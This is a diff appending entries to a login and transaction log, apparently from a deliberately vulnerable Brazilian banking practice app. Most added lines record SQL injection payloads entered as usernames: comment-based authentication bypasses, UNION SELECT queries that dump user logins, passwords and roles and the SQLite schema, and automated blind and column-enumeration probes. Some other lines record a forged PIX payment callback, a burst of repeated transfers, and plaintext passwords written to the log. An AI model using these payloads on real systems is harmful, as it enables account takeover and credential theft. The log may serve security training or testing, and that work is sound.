@@ -8,3 +8,48 @@
 [14/03/2024 14:26:40] [INFO] User 'user' Password 'user' logged
 [30/03/2025 23:01:46] [ERROR] User 'users' Password 'user' ERROR
 [30/03/2025 23:01:50] [INFO] User 'user' Password 'user' logged
+[06/08/2026 17:57:54] [INFO] User 'marcelo' Password 'marcelo' logged
+[06/08/2026 17:58:00] [INFO] User 'marcelo' Password 'marcelo' logged
+[06/08/2026 17:58:22] [INFO] User 'ana.silva' Password 'Cliente@123' logged
+[06/08/2026 17:58:22] [INFO] User 'admin' -- ' Password 'x' logged (sql)
+[06/08/2026 17:58:56] [INFO] User 'ana.silva' Password 'Cliente@123' logged
+[06/08/2026 17:58:57] [INFO] PIX callback credited 999999 to 3 ext=forged
+[06/08/2026 17:59:24] [INFO] User 'marcelo' Password 'marcelo' logged
+[06/08/2026 17:59:24] [INFO] Transfer 2000 from 2 to 4 by af27290e-3e91-4f6f-945c-6af304315306
+[06/08/2026 17:59:24] [INFO] Transfer 2000 from 2 to 4 by af27290e-3e91-4f6f-945c-6af304315306
+[06/08/2026 17:59:24] [INFO] Transfer 2000 from 2 to 4 by af27290e-3e91-4f6f-945c-6af304315306
+[06/08/2026 17:59:24] [INFO] Transfer 2000 from 2 to 4 by af27290e-3e91-4f6f-945c-6af304315306
+[06/08/2026 17:59:24] [INFO] Transfer 2000 from 2 to 4 by af27290e-3e91-4f6f-945c-6af304315306
+[11/08/2026 21:36:07] [ERROR] User 'admin' Password 'admin'
+[11/08/2026 21:36:09] [ERROR] User 'admin' Password 'admin'
+[25/08/2026 19:49:29] [INFO] User 'marcelo' Password 'marcelo' logged (sql)
+[25/08/2026 19:49:29] [INFO] User 'admin' -- ' Password 'qualquercoisa' logged (sql)
+[25/08/2026 19:49:39] [INFO] User 'x' UNION SELECT 1,name,login,password,role,1,0 FROM users WHERE role='admin' -- ' Password 'x' logged (sql)
+[25/08/2026 19:49:39] [INFO] User 'x' UNION SELECT 1,name,sql,'p','r',1,0 FROM sqlite_master WHERE type='table' -- ' Password 'x' logged (sql)
+[25/08/2026 20:21:03] [INFO] User 'admin' -- ' Password 'xxx' logged (sql)
+[25/08/2026 20:35:51] [INFO] User 'admin' AND 1537=(SELECT (CASE WHEN (1537=1537) THEN 1537 ELSE (SELECT 7830 UNION SELECT 3486) END))-- dTpN' Password 'x' logged (sql)
+[25/08/2026 20:35:51] [INFO] User 'admin' AND 2747=2747-- WXOL' Password 'x' logged (sql)
+[25/08/2026 20:35:51] [INFO] User 'admin' AND CASE WHEN 5271=5271 THEN 5271 ELSE JSON(CHAR(101,72,70,110)) END-- ismb' Password 'x' logged (sql)
+[25/08/2026 20:35:52] [INFO] User 'admin';SELECT LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))--' Password 'x' logged (sql)
+[25/08/2026 20:35:52] [INFO] User 'admin';SELECT LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(000000000/2))))--' Password 'x' logged (sql)
+[25/08/2026 20:35:53] [INFO] User 'admin';SELECT LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))--' Password 'x' logged (sql)
+[25/08/2026 20:35:54] [INFO] User 'admin' ORDER BY 1-- JAvt' Password 'x' logged (sql)
+[25/08/2026 20:35:54] [INFO] User 'admin' ORDER BY 6-- tzGG' Password 'x' logged (sql)
+[25/08/2026 20:35:54] [INFO] User 'admin' ORDER BY 7-- Gywn' Password 'x' logged (sql)
+[25/08/2026 20:35:54] [INFO] User 'admin' UNION ALL SELECT CHAR(113,98,113,107,113)||CHAR(70,73,69,88,68,67,110,121,80,89,74,67,103,106,85,99,70,81,119,118,106,77,79,73,98,67,83,112,86,119,79,87,65,86,98,68,66,109,67,105)||CHAR(113,118,120,106,113),NULL,NULL,NULL,NULL,NULL,NULL-- GUOg' Password 'x' logged (sql)
+[25/08/2026 20:35:54] [INFO] User 'admin' UNION ALL SELECT NULL,NULL,CHAR(113,98,113,107,113)||CHAR(98,105,90,71,118,117,98,105,90,115,103,87,88,89,77,121,78,121,116,100,85,76,66,116,107,66,85,77,82,109,67,98,103,115,102,109,98,65,106,107)||CHAR(113,118,120,106,113),NULL,NULL,NULL,NULL-- mZOX' Password 'x' logged (sql)
+[25/08/2026 20:35:54] [INFO] User 'admin' UNION ALL SELECT NULL,NULL,NULL,CHAR(113,98,113,107,113)||CHAR(109,119,102,76,85,80,71,113,71,97,80,84,68,81,71,73,75,122,121,79,110,110,105,76,70,104,80,120,97,82,105,121,117,72,66,76,74,117,66,69)||CHAR(113,118,120,106,113),NULL,NULL,NULL-- bjHv' Password 'x' logged (sql)
+[25/08/2026 20:35:54] [INFO] User 'admin' UNION ALL SELECT NULL,CHAR(113,98,113,107,113)||CHAR(83,67,81,81,85,104,118,82,85,67,97,68,101,111,70,114,69,98,65,114,101,113,104,118,116,119,73,121,84,112,105,80,71,70,77,70,82,83,117,114)||CHAR(113,118,120,106,113),NULL,NULL,NULL,NULL,NULL-- iSJS' Password 'x' logged (sql)
+[25/08/2026 20:35:54] [INFO] User 'admin' UNION ALL SELECT NULL,NULL,NULL,NULL,CHAR(113,98,113,107,113)||CHAR(70,87,79,119,77,69,87,117,70,116,69,110,84,76,115,72,67,74,65,85,111,105,69,80,99,67,119,86,71,122,107,117,81,77,118,110,108,100,107,68)||CHAR(113,118,120,106,113),NULL,NULL-- iINY' Password 'x' logged (sql)
+[25/08/2026 20:36:39] [INFO] User '' OR 1=1 -- ' Password 'x' logged (sql)
+[25/08/2026 20:36:39] [INFO] User 'admin' ORDER BY 7 -- ' Password 'x' logged (sql)
+[25/08/2026 20:36:39] [INFO] User 'admin'--' Password 'x' logged (sql)
+[25/08/2026 20:36:52] [INFO] User 'admin'--' Password 'x' logged (sql)
+[25/08/2026 20:36:52] [INFO] User 'admin'/*' Password 'x' logged (sql)
+[25/08/2026 20:36:52] [INFO] User 'x' UNION SELECT 1,name,login,password,role,1,0 FROM users LIMIT 1 OFFSET 3--' Password 'x' logged (sql)
+[25/08/2026 21:02:04] [INFO] User 'admin' ORDER BY 5 -- ' Password 'x' logged (sql)
+[25/08/2026 21:02:04] [INFO] User 'admin' ORDER BY 6 -- ' Password 'x' logged (sql)
+[25/08/2026 21:02:04] [INFO] User 'admin' ORDER BY 7 -- ' Password 'x' logged (sql)
+[25/08/2026 21:02:04] [INFO] User 'admin' -- ' Password 'x' logged (sql)
+[25/08/2026 21:02:04] [INFO] User '' OR 1=1 -- ' Password 'x' logged (sql)
+[25/08/2026 21:02:15] [INFO] User 'admin' -- ' Password 'qualquercoisa' logged (sql)
